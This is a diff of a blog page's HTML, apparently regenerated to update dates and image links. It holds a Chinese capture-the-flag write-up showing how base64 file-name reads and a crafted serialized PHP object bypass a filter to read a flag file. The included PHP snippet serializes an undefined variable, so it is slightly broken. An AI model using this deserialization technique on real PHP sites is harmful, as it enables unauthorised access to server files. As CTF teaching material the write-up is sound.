@@ -243,7 +243,7 @@
 
     
         <meta property="article:published_time" content="Sun Mar 11 2018 16:52:47 GMT+0800">
-        <meta property="article:modified_time" content="Thu Jun 07 2018 19:13:17 GMT+0800">
+        <meta property="article:modified_time" content="Mon Jul 16 2018 18:51:22 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -266,7 +266,7 @@
     "mainEntityOfPage": "https://kabeor.github.io/PCTF2016 Web300神盾局的秘密(反序列化漏洞)/index.html",
     "headline": "PCTF2016 Web300神盾局的秘密(反序列化漏洞)",
     "datePublished": "Sun Mar 11 2018 16:52:47 GMT+0800",
-    "dateModified": "Thu Jun 07 2018 19:13:17 GMT+0800",
+    "dateModified": "Mon Jul 16 2018 18:51:22 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "kabeor",
@@ -385,7 +385,7 @@
     <!-- Paradox Post Header -->
     
         <!-- Custom Thumbnail -->
-        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(http://p29uh0fw7.bkt.clouddn.com/kabeo/180607/gAbH34dKDE.png?imageslim)">
+        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://i.loli.net/2018/07/16/5b4c62738c5f7.png)">
     
             <p class="article-headline-p">
                 PCTF2016 Web300神盾局的秘密(反序列化漏洞)
@@ -475,23 +475,23 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="PCTF2016-Web300神盾局的秘密-反序列化漏洞"><a href="#PCTF2016-Web300神盾局的秘密-反序列化漏洞" class="headerlink" title="PCTF2016 Web300神盾局的秘密(反序列化漏洞)"></a>PCTF2016 Web300神盾局的秘密(反序列化漏洞)</h1><p>打开之后是这样的<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/ih43CAAgEg.png?imageslim" alt="mark"></p>
-<p>查看网页源代码，只有一行<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/4ECC7BiAae.png?imageslim" alt="mark"></p>
-<p>很明显这是base64加密，于是解密看一下<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/lbc0FKII7G.png?imageslim" alt="mark"><br>于是看出访问格式为</p>
+        <h1 id="PCTF2016-Web300神盾局的秘密-反序列化漏洞"><a href="#PCTF2016-Web300神盾局的秘密-反序列化漏洞" class="headerlink" title="PCTF2016 Web300神盾局的秘密(反序列化漏洞)"></a>PCTF2016 Web300神盾局的秘密(反序列化漏洞)</h1><p>打开之后是这样的<br><img src="https://i.loli.net/2018/07/16/5b4c667ef3187.jpg" alt="mark"></p>
+<p>查看网页源代码，只有一行<br><img src="https://i.loli.net/2018/07/16/5b4c667f12cff.jpg" alt="mark"></p>
+<p>很明显这是base64加密，于是解密看一下<br><img src="https://i.loli.net/2018/07/16/5b4c667f36854.jpg" alt="mark"><br>于是看出访问格式为</p>
 <pre><code>showimg.php?img=文件名的base64
-</code></pre><p>得到格式之后，先看showimg.php，base64加密访问<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/mIa4jG021C.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/7mcDCAJJ5H.png?imageslim" alt="mark"><br>可以看出，这里过滤掉了一些特殊字符以及pctf字符串。</p>
-<p>我们再来看看index.php，把它base64加密<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/G0EK0Kh95b.png?imageslim" alt="mark"></p>
-<p>然后访问，查看源代码<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/HE1l714B3b.png?imageslim" alt="mark"><br>我们看到<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br></pre></td></tr></table></figure></p>
+</code></pre><p>得到格式之后，先看showimg.php，base64加密访问<br><img src="https://i.loli.net/2018/07/16/5b4c787bb195c.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c787bcbff2.jpg" alt="mark"><br>可以看出，这里过滤掉了一些特殊字符以及pctf字符串。</p>
+<p>我们再来看看index.php，把它base64加密<br><img src="https://i.loli.net/2018/07/16/5b4c787be801d.jpg" alt="mark"></p>
+<p>然后访问，查看源代码<br><img src="https://i.loli.net/2018/07/16/5b4c787c0f60f.jpg" alt="mark"><br>我们看到<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>require_once语句在脚本执行期间包含并运行指定文件。</p>
 </blockquote>
-<p>于是我们需要访问shield.php,再次base64加密访问<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/mHbBhaD6jj.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/b6l8ac8CCD.png?imageslim" alt="mark"></p>
+<p>于是我们需要访问shield.php,再次base64加密访问<br><img src="https://i.loli.net/2018/07/16/5b4c787c2b7ba.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c787c3ee77.jpg" alt="mark"></p>
 <p>这里提示我们flag就在pctf.php里，但是showimg.php中过滤了pctf，那么我们又注意到index.php中最后<br><code>$x=unserialize($g)</code><br>也就是反序列化字符串，所以我们可以自己将pctf.php序列化然后传入</p>
 <p>构造类似shield.php中的类如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Shield &#123;</span><br><span class="line">        public $file;</span><br><span class="line">        function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">            $this -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$x = new Shield();</span><br><span class="line">$x -&gt; file = &apos;pctf.php&apos;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
-<p>运行<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/L5i32666c2.png?imageslim" alt="mark"><br>将得到结果传入<br>即访问的是</p>
+<p>运行<br><img src="https://i.loli.net/2018/07/16/5b4c787c515d6.jpg" alt="mark"><br>将得到结果传入<br>即访问的是</p>
 <pre><code>index.php?class=序列化字符串
-</code></pre><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/IL7E600d64.png?imageslim" alt="mark"></p>
+</code></pre><p><img src="https://i.loli.net/2018/07/16/5b4c787c675cd.jpg" alt="mark"></p>
 <p>得到flag</p>
 <p>完结</p>
 <p>From <a href="https://kabeor.github.io/PCTF2016 Web300神盾局的秘密(反序列化漏洞">https://kabeor.github.io/PCTF2016 Web300神盾局的秘密(反序列化漏洞)/</a>/) bye</p>
@@ -874,7 +874,7 @@ It will not impact the appearance and can give developers a lot of support :)
     
 
     <span class="post-count">全站共</span> 
-    104.7k 
+    105.1k 
     <span>字</span>
 </div>
 
